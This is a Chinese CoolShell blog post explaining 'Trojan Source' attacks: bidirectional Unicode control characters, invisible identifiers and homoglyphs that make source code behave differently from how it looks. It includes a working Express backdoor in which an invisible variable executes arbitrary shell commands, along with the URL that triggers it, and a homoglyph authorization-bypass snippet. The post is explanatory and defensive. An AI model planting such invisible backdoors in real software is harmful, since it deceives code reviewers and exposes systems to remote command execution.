@@ -1,0 +1,103 @@
+<html><body><p><img alt="" class="alignright size-full wp-image-21658" height="270" src="../wp-content/uploads/2021/11/il_340x270_pggv.jpg" width="340"/>最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below.”也就是说我们的代码中有一些 bidirectional unicode 的文本，中文直译作 “双向文本”，意思是一些语言是从左到右的，而另一些则是是从右到左的（如：阿拉伯语），如果同一个文件里，即有从左向右的文本也有从右向左文本两种的混搭，那么，就叫bi-direction。术语通常缩写为“ <b>BiDi</b> ”或“ <b>bidi</b> ”。使用双向文本对于中国人来说并不陌生，因为中文又可以从左到右，也可以从右到左，还可以从上到下。</p>
+<p><img alt="" class="aligncenter size-large wp-image-21652" height="206" src="../wp-content/uploads/2021/11/1637305049427-1024x329.jpg" width="640"/></p>
+<p>早期的计算机仅设计为基于拉丁字母的从左到右的方式。添加新的字符集和字符编码使许多其他从左到右的脚本能够得到支持，但不容易支持从右到左的脚本，例如阿拉伯语或希伯来语，并且将两者混合使用更是不可能。从右到左的脚本是通过<a href="https://en.wikipedia.org/wiki/ISO/IEC_8859-6" title="ISO/IEC 8859-6">ISO/IEC 8859-6</a>和<a href="https://en.wikipedia.org/wiki/ISO/IEC_8859-8" title="ISO/IEC 8859-8">ISO/IEC 8859-8</a>等编码引入的，通常以书写和阅读顺序存储字母。可以简单地将从左到右的显示顺序翻转为从右到左的显示顺序，但这样做会牺牲正确显示从左到右脚本的能力。通过双向文本支持，可以在同一页面上混合来自不同脚本的字符，而不管书写方向如何。</p>
+<p><span id="more-21649"></span></p>
+<p>双向文本支持是计算机系统正确显示双向文本的能力。对于Unicode来说，其标准为完整的 BiDi 支持提供了基础，其中包含有关如何编码和显示从左到右和从右到左脚本的混合的详细规则。你可以使用一些控制字符来帮助你完成双向文本的编排。</p>
+<p>好的，科普完“双向文本”后，我们正式进入正题，为什么Github 会出这个警告？Github的官方博客“<a href="https://github.blog/changelog/2021-10-31-warning-about-bidirectional-unicode-text/" rel="noopener" target="_blank">关于双向Unicode的警告</a>”中说，使用一些Unicode中的用于控制的隐藏字符，可以让你代码有着跟看上去完全不一样的行为。</p>
+<p>我们先来看一个示例，下面这段 Go 的代码就会把 “Hello, World”的每个字符转成整型，然后计算其中多少个为 1 的 bit。</p>
+<pre class="EnlighterJSRAW">package main
+
+import "fmt"
+
+func main() {
+  str, mask := "Hello, World!‮10x‭", 0
+
+  bits := 0
+  for _, ch := range str {
+    for ch &gt; 0 {
+      bits += int(ch) &amp; mask
+      ch = ch &gt;&gt; 1
+    }
+  }
+  fmt.Println("Total bits set:", bits)
+}</pre>
+<p>这个代码你看上去没有什么 奇怪的地方，但是你在执行的时候（可以直接上Go Playground上执行  –<a href="https://play.golang.org/p/e2BDZvFlet0" rel="noopener" target="_blank"> https://play.golang.org/p/e2BDZvFlet0</a>），你会发现，结果是 0，也就是说“Hello, World”中没有值为 1 的 bit 位。这究竟发生了什么事？</p>
+<p>如果你把上面这段代码拷贝粘贴到字符界面上的 vim 编辑器里，你就可以看到下面这一幕。</p>
+<p><img alt="" class="aligncenter wp-image-21653" height="324" src="../wp-content/uploads/2021/11/1637307319589.jpg" width="500"/></p>
+<p>其中有两个浅蓝色的尖括号的东西—— <code>&lt;202e&gt;</code> 和 <code>&lt;202d&gt;</code> 。这两个字符是两个Unicode的控制字符（注：完整的双向文本控制字符参看 <a href="https://www.compart.com/en/unicode/bidiclass" rel="noopener" target="_blank">Unicode Bidirectional Classes</a>）：</p>
+<ul>
+<li><strong>U+202E – Right-to-Left Override [RLO] </strong><br/>
+表示，开始从右到左显示，于是，接下来的文本 <code>10x", 0</code> 变成了 <code>0 ,"x01</code></li>
+<li><strong>U+202D – Left-to-Right Override [LRO]</strong><br/>
+表示，开始从左到右显示，于是，<code>0,"x01</code> 中的前4个字符<code>0 ,"</code> 反转成  <code>", 0</code>，于是整个文本成了 <code>", 0x01</code></li>
+</ul>
+<p>所以，你在视觉上看到的是结果是—— <code>"Hello, World!”, 0x01</code>， 但是实际上是完全是另外一码事。</p>
+<p>然后，Github官方博客中还给了一个安全问题 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42574">CVE-2021-42574</a> ——</p>
+<blockquote><p>在 Unicode 规范到 14.0 的双向算法中发现了一个问题。它允许通过控制序列对字符进行视觉重新排序，可用于制作源代码，呈现与编译器和解释器执行逻辑完全不同的逻辑。攻击者可以利用这一点对接受 Unicode 的编译器的源代码进行编码，从而将目标漏洞引入人类审查者不可见的地方。</p></blockquote>
+<p>这个安全问题在剑桥大学的这篇论文“<a href="https://www.trojansource.codes/" rel="noopener" target="_blank">Some Vulnerabilities are Invisible</a>”中有详细的描述。其中PDF版的文章中也给了这么一个示例：</p>
+<p>通过双向文本可以把下面这段代码：</p>
+<p><img alt="" class="aligncenter wp-image-21655" height="240" src="../wp-content/uploads/2021/11/1637308872541.jpg" width="569"/></p>
+<p>伪装成下面的这个样子：</p>
+<p><img alt="" class="aligncenter wp-image-21654" height="245" src="../wp-content/uploads/2021/11/1637308847435.jpg" width="580"/></p>
+<p>在图 2 中<code>'alice'</code>被定义为价值 100，然后是一个从 Alice 中减去资金的函数。最后一行以 50 的值调用该函数，因此该小程序在执行时应该给我们 50 的结果。</p>
+<p>然而，图 1 向我们展示了如何使用双向字符来破坏程序的意图：通过插入<strong>RLI (Right To Left Isolate)</strong><i> – </i><strong>U+2067</strong><i>，</i>我们将文本方向从传统英语更改为从右到左。尽管我们使用了减去资金功能，但图 1 的输出变为 100。</p>
+<p>除此之外，支持Unicode还可以出现很多其它的攻击，尤其是通过一些“不可见字符”，或是通过“同形字符”在源代码里面埋坑。比如文章“<a href="https://certitude.consulting/blog/en/invisible-backdoor/" rel="noopener" target="_blank">The Invisible Javascript Backdoor</a>”里的这个示例：</p>
+<pre class="EnlighterJSRAW">const express = require('express');
+const util = require('util');
+const exec = util.promisify(require('child_process').exec);
+
+const app = express();
+
+app.get('/network_health', async (req, res) =&gt; {
+    const { timeout,ㅤ} = req.query;
+    const checkCommands = [
+        'ping -c 1 google.com',
+        'curl -s http://example.com/',ㅤ
+    ];
+
+    try {
+        await Promise.all(checkCommands.map(cmd =&gt; 
+                cmd &amp;&amp; exec(cmd, { timeout: +timeout || 5_000 })));
+        res.status(200);
+        res.send('ok');
+    } catch(e) {
+        res.status(500);
+        res.send('failed');
+    }
+});
+
+app.listen(8080);</pre>
+<p>上面这个代码实现了一个非常简单的网络健康检查，HTTP会执行 <code>ping -c 1 google.com</code> 以及 <code>curl -s http://example.com</code> 这两个命令来查看网络是否正常。其中，可选输入 HTTP 参数<code>timeout</code>限制命令执行时间。</p>
+<p>然后，上面这个代码是有不可见的Unicode 字符，如果你使用VSCode，把编码从 Unicode 改成 DOS (CP437) 后你就可以看到这个Unicode了</p>
+<p><img alt="" class="aligncenter size-large wp-image-21656" height="577" src="../wp-content/uploads/2021/11/1637310735683-1024x923.jpg" width="640"/></p>
+<p>于是，一个你看不见的 <code>πàñ</code> 变量就这样生成了，你再仔细看一下整个逻辑，这个看不见的变量，可以让你的代码执行他想要的命令。因为，http 的请求中有第二个参数，这个参数可奖在后面被执行。于是我们可以构造如下的的 HTTP 请求：</p>
+<p style="text-align: center;"><strong>http://host:port/network_health?%E3%85%A4=&lt;any command&gt;</strong></p>
+<p>其中的，%E3%85%A4 就是 <code>\u3164</code> 这个不可见Unicode 的编码，于是，一个后门代码就这样在神不知鬼不觉的情况下注入了。</p>
+<p>另外，还可以使用“同形字符”，看看下面这个示例：</p>
+<pre class="EnlighterJSRAW">if(environmentǃ=ENV_PROD){
+    // bypass authZ checks in DEV
+    return true;
+}</pre>
+<p>如何你以为 <code>ǃ</code> 是 惊叹号，其实不是，它是一个Unicode <code>╟â</code>。这种东西就算你把你的源码转成 DOS(CP437) 也没用，因为用肉眼在一大堆正常的字符中找不正常的，我觉得是基本不可能的事。</p>
+<p>现在，是时候检查一下你的代码有没有上述的这些情况了……</p>
+<p>（全文完）</p>
+<p> </p>
+<p> <!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px; color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+<div class="wp_rp_wrap wp_rp_vertical_m"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/3684.html"><img alt="Web开发人员速查卡" height="150" src="../wp-content/uploads/2011/02/1128-150x150.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/3684.html">Web开发人员速查卡</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/2439.html"><img alt="黑客的价值观" height="150" src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/16.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/2439.html">黑客的价值观</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/1957.html"><img alt="Web程序的最佳测试数据" height="150" src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/9.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/1957.html">Web程序的最佳测试数据</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/1331.html"><img alt="Unicode字符预览表" height="150" src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/11.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/1331.html">Unicode字符预览表</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/3778.html"><img alt="敏捷水管工" height="150" src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/3778.html">敏捷水管工</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/10910.html"><img alt="分布式系统的事务处理" height="150" src="../wp-content/uploads/2014/01/trade-off-150x150.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/10910.html">分布式系统的事务处理</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/21649.html">源代码特洛伊木马攻击</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.</body></html>
